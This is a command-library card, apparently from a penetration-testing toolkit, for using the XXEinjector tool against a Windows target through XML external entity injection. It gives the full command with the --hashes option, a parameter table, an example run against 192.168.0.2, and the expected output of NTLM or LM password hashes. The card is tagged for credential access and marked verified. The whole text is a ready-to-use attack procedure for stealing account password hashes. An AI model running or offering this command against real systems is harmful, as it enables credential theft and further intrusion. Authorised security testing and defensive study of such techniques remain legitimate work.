---
id: d1d114fe-7e61-4680-aed2-83dae5203507
name: xxeinjector-steal-windows-hashes
type: command
executor: bash
data: ruby XXEinjector.rb --host=$__HOST --file=/tmp/req.txt --hashes
output: null
created_at: '2023-04-06T03:56:43.973646+00:00'
updated_at: '2023-04-10T20:24:45.357412+00:00'
platforms:
  - Web
  - Windows
tags:
  - xxe
  - credential-access
  - hashes
verified: true
validated: true
---

# xxeinjector-steal-windows-hashes

## Command

```bash
ruby XXEinjector.rb --host=$__HOST --file=/tmp/req.txt --hashes
```

## Description

Extracts Windows password hashes (e.g., SAM file) via XXE on a Windows target.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| $__HOST | Target host | Yes |
| --file=/tmp/req.txt | Request file | Yes |
| --hashes | Enable hash extraction | Built-in |

## Examples

### Basic Usage

```bash
ruby XXEinjector.rb --host=192.168.0.2 --file=/tmp/req.txt --hashes
```

## Expected Output

NTLM or LM hashes for user accounts.

## Related

- [[procedures/Exploit-XXE-Vulnerability-Using-Multiple-Tools]]
- [[tools/XXEinjector]]
